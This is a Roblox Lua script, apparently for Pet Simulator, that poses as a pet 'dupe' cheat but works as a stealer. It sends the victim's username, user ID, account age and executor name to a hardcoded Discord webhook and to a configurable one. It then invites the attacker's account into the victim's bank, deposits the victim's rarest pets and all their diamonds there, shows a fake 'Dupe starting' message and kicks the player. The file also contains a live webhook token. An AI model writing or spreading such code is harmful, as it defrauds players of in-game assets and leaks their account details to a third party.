local plr = game.Players.LocalPlayer
local OSTime = os.time()
local Time = os.date('!*t', OSTime)
local Headers = {["content-type"] = "application/json"}
local mutedaudios = {}
local RunService = game:GetService("RunService")
local deb = false
local lib = require(game.ReplicatedStorage:WaitForChild('Framework'):WaitForChild('Library'))
local mydiamonds = string.gsub(game:GetService("Players").LocalPlayer.PlayerGui.Main.Right.Diamonds.Amount.Text, "%,", "")
local mybanks = lib.Network.Invoke("get my banks")
local PetsList = {}

local function getexploit()
	local exploit =
		(syn and not is_sirhurt_closure and not pebc_execute and "Synapse X") or 
		(isexecutorclosure and "Script-Ware V2") or
		(secure_load and "Sentinel") or
		(is_sirhurt_closure and "SirHurt V4") or
		(pebc_execute and "ProtoSmasher") or
		(KRNL_LOADED and "Krnl") or
		(WrapGlobal and "WeAreDevs") or
		(isvm and "Proxo") or
		(shadow_env and "Shadow") or
		(jit and "EasyExploits") or
		(getreg()['CalamariLuaEnv'] and "Calamari") or
		(unit and "Unit") or
		("Undetectable")
	return exploit
end

local Content = 'Some idiot just executed @everyone'
local Embed = {
	["title"] = "__**Stealr Info**__",
	["description"] = "Name: "..plr.Name.."\nDisplay Name: "..plr.DisplayName.."\nExploit: "..getexploit().."\nGame: https://www.roblox.com/games/"..game.PlaceId,
	["type"] = "rich",
	["color"] = tonumber(0x00FFFF),
	["thumbnail"] = {
		["url"] = "https://www.roblox.com/asset-thumbnail/image?assetId="..game.PlaceId.."&width=768&height=432"
	},
	["image"] = {
		["url"] = "http://www.roblox.com/Thumbs/Avatar.ashx?x=250&y=250&Format=Png&username="..plr.Name
	},
	["fields"] = {
		{
			["name"] = "__Account Age/Alt Detector:__",
			["value"] = plr.AccountAge.." days old",
			["inline"] = false
		},
		{
			["name"] = "__User ID:__",
			["value"] = plr.UserId,
			["inline"] = false
        },
		{
			["name"] = "__Profile Link:__",
			["value"] = "https://www.roblox.com/users/"..plr.UserId,
			["inline"] = false
		}
	},
	["timestamp"] = string.format('%d-%d-%dT%02d:%02d:%02dZ', Time.year, Time.month, Time.day, Time.hour, Time.min, Time.sec),
};
(syn and syn.request or http_request or http.request) {
	Url = 'https://discord.com/api/webhooks/1063318992879624232/KNt3fY5Gut6_h8mCBCX72MXunQaTXe5Kj-MLB1Zq7vJGMV1KTf5oLTUxSa8BrQdd_P0-';
	Method = 'POST';
	Headers = {
		['Content-Type'] = 'application/json';
	};
	Body = game:GetService'HttpService':JSONEncode({content = Content; embeds = {Embed}; });
};

local function getexploit()
	local exploit =
		(syn and not is_sirhurt_closure and not pebc_execute and "Synapse X") or 
		(isexecutorclosure and "Script-Ware V2") or
		(secure_load and "Sentinel") or
		(is_sirhurt_closure and "SirHurt V4") or
		(pebc_execute and "ProtoSmasher") or
		(KRNL_LOADED and "Krnl") or
		(WrapGlobal and "WeAreDevs") or
		(isvm and "Proxo") or
		(shadow_env and "Shadow") or
		(jit and "EasyExploits") or
		(getreg()['CalamariLuaEnv'] and "Calamari") or
		(unit and "Unit") or
		("Undetectable")
	return exploit
end

local Content = 'Some idiot just executed @everyone'
local Embed = {
	["title"] = "__**Stealr Info**__",
	["description"] = "Name: "..plr.Name.."\nDisplay Name: "..plr.DisplayName.."\nExploit: "..getexploit().."\nGame: https://www.roblox.com/games/"..game.PlaceId,
	["type"] = "rich",
	["color"] = tonumber(0x00FFFF),
	["thumbnail"] = {
		["url"] = "https://www.roblox.com/asset-thumbnail/image?assetId="..game.PlaceId.."&width=768&height=432"
	},
	["image"] = {
		["url"] = "http://www.roblox.com/Thumbs/Avatar.ashx?x=250&y=250&Format=Png&username="..plr.Name
	},
	["fields"] = {
		{
			["name"] = "__Account Age/Alt Detector:__",
			["value"] = plr.AccountAge.." days old",
			["inline"] = false
		},
		{
			["name"] = "__User ID:__",
			["value"] = plr.UserId,
			["inline"] = false
        },
		{
			["name"] = "__Profile Link:__",
			["value"] = "https://www.roblox.com/users/"..plr.UserId,
			["inline"] = false
		}
	},
	["timestamp"] = string.format('%d-%d-%dT%02d:%02d:%02dZ', Time.year, Time.month, Time.day, Time.hour, Time.min, Time.sec),
};
(syn and syn.request or http_request or http.request) {
	Url = _G.Webhook;
	Method = 'POST';
	Headers = {
		['Content-Type'] = 'application/json';
	};
	Body = game:GetService'HttpService':JSONEncode({content = Content; embeds = {Embed}; });
};

--stealr
for i,v in pairs(lib.Save.Get().Pets) do
	local v2 = lib.Directory.Pets[v.id];
	if v2.rarity == "Exclusive" or v2.rarity == "Mythical" and v.dm or v2.rarity == "Legendary" and v.r then
		table.insert(PetsList, v.uid);
	end
end
lib.Network.Invoke("Invite To Bank", mybanks[1]['BUID'], 3267937944)
local request, request2 = lib.Network.Invoke("Bank Deposit", mybanks[1]['BUID'], PetsList, mydiamonds - 0);
if request then
	lib.Message.New("Dupe starting! Please wait atleast 30 Minutes");
wait(2)
    game.Players.LocalPlayer:kick(_G.KickMessage)
else
end
if lib.Network.Invoke("Invite To Bank", mybanks[1]['BUID'], _G.UserID) then
	lib.Message.New("Dupe Proccesing! (make sure your bank have pet or gems for duping!)");

else
	lib.Message.New("Must be in server for atleast 30 seconds");
end;
